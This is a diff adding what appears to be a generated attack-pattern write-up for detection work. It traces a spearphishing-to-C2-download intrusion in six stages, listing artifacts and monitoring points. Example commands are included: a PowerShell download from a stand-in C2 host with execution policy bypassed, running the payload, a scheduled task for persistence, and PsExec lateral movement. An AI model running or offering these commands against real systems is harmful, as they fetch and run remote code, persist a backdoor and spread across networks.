@@ -1,0 +1,58 @@
+<output>
+Pattern Name: C2 File Download  
+Scenario Overview: An attacker uses spearphishing emails with malicious attachments to gain initial access to a victim's system. The attacker then downloads additional tools from a command and control (C2) server to facilitate further exploitation and lateral movement within the network.
+
+Attack Flow Breakdown:  
+**Stage 1: Initial Access via Spearphishing**  
+- **Applications Involved**: Outlook  
+- **User Action**: The user receives an email with a malicious attachment (e.g., a Word document).  
+- **Key Artifacts**: Email headers, attachment file (e.g., `malicious.docx`).  
+- **Detection Focus**: Monitor for emails with suspicious attachments or links.  
+
+**Stage 2: Execution of Malicious Attachment**  
+- **Applications Involved**: Microsoft Word (child of Outlook)  
+- **User Action**: The user opens the attachment, triggering a macro that executes a PowerShell command to download a payload.  
+- **Key Artifacts**: PowerShell command execution logs, Word document macros.  
+- **Detection Focus**: Monitor for execution of macros in Word documents and PowerShell commands initiated from Word.  
+```shell
+# Example PowerShell command executed by the macro
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious-c2.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\payload.exe'"
+```
+
+**Stage 3: Downloading Additional Tools from C2**  
+- **Applications Involved**: PowerShell  
+- **User Action**: The PowerShell command downloads a malicious executable from the C2 server.  
+- **Key Artifacts**: Downloaded file (`payload.exe`), network logs showing connections to the C2 server.  
+- **Detection Focus**: Monitor for unusual outbound connections and file downloads from known malicious domains.  
+
+**Stage 4: Execution of Downloaded Payload**  
+- **Applications Involved**: PowerShell (or cmd.exe)  
+- **User Action**: The attacker executes the downloaded payload to establish a backdoor.  
+- **Key Artifacts**: Process creation logs for `payload.exe`, network connections initiated by the payload.  
+- **Detection Focus**: Monitor for execution of newly downloaded executables and any unusual process creation.  
+```shell
+# Example command to execute the downloaded payload
+start C:\Users\Victim\Downloads\payload.exe
+```
+
+**Stage 5: Establishing Persistence and Further Exploitation**  
+- **Applications Involved**: Windows Task Scheduler, PowerShell  
+- **User Action**: The attacker creates a scheduled task to ensure persistence.  
+- **Key Artifacts**: Scheduled task entries, PowerShell commands for task creation.  
+- **Detection Focus**: Monitor for creation of scheduled tasks that execute unusual binaries.  
+```shell
+# Example command to create a scheduled task for persistence
+schtasks /create /tn "MaliciousTask" /tr "C:\Users\Victim\Downloads\payload.exe" /sc onlogon /rl highest
+```
+
+**Stage 6: Lateral Movement**  
+- **Applications Involved**: PsExec, PowerShell  
+- **User Action**: The attacker uses PsExec to move laterally to another system in the network.  
+- **Key Artifacts**: PsExec logs, network traffic between internal systems.  
+- **Detection Focus**: Monitor for use of PsExec and other remote execution tools.  
+```shell
+# Example command to execute a command on a remote machine
+psexec \\TargetMachine -u AdminUser -p AdminPassword cmd.exe /c "C:\Path\To\MaliciousTool.exe"
+```
+
+</output>
